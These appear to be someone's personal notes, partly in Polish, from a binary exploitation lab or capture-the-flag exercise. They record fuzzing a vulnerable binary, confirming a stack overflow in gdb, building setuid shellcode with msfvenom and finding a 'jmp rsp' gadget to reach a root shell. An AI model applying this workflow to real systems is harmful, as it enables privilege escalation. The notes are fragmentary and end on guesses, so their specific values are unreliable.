# Lima notes

- app run, tested how it works
- app loads to buffer only if word is palindrome
- first `fuzz.py` to check when it crashes
- second `fuzz2.py` to find the exact place
- made sure with:

    - disassembled main and found final ret:
    ```text
    0x00000000004012c2 <+266>:   ret
    ```
    - set a breakpoint on that address
    - run the script in gdb:

    ```
    run $(python3 -c "import sys;text = '';buf_len = 200;payload = 'HELLO';text = buf_len * 'A';text += payload + payload[::-1];text += buf_len * 'A';sys.stdout.buffer.write(text.encode())")
    ```
    - read the rsp register:

    ```text
    x/gx $rsp
    0x7fffffffffff: 0x4c4c4f4f4c4c4548
    ```
    - vales are printed backwads but there is my 'HELLO'

- find address of buf: 0x7ffc83ffb9e0
- instruction after strcpy: 0x000000000040129a
- `readelf -s vuln` - info about vulnerable binary
- will need to use `setuid(0)` before spawning the shell 

```bash
msfvenom -p linux/x64/exec PrependSetUid=True -b "\x00\x0a\x20\x09" --smallest > rt.bin
```
```bash
gdb --args ./neuromancer_hard "$(python3 cfp.py)"
```

- 0x6174696f6c707845 - Exploitable backwards
- info sharedlib

```bash
find /b 0x00007e60c607f060, 0x00007e60c60a4111, 0xff, 0xe4 - /lib64/ld-linux-x86-64.so.2
find /b 0x00007af59f06c380, 0x00007af59f1c022d, 0xff, 0xe4 - /lib/x86_64-linux-gnu/libc.so.6
```

```bash
T=$(readlink -f /lib64/ld-linux-x86-64.so.2)
ROPgadget --binary "$T" --only "jmp" | grep 'jmp rsp'
```
- output : 0x000000000001ddbb : jmp rsp
- that's offset so sum is 0x7e60c609ce1b
- that's out address


0x500000000000
0x7ffdf2416110

- 192
- 220 bajtow od startu inputu
- ostatni bajt na 0x7fffffffe7e0


- 0x40129a - breakpoint after `strcpy` command

- adres 0x7fffd900d030

- wartosc 0x90909090906a4a59 gdy \xe7\x55
- wartosc 0x90909090906a4a59 gdy \xe8\x06

- &buf =    0x7fff386fd370
            0x7ffe76747870

- saved at  0x4162304162314162
            0x4162304162314162
- Ab0Ab1Ab
- po 30 bajtach mamy adres (?)